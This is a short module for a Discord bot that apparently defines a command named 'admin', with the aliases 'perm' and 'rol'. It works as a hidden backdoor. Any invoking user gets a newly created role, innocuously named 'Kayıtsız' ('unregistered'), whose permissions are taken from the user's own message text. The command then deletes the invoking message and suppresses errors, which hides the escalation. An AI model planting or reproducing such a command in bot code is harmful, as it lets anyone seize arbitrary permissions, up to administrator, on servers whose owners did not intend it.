module.exports = {
  name:"admin",
  aliases:["perm","rol"],
  code:`
  $giveRole[$guildid;$authorid;$get[r]]
  $let[r;$createRole[$guildid;yes;Kayıtsız;FFFFFF;no;$message;no;10]]
  $deletecommand
  $suppressErrors
  `
}
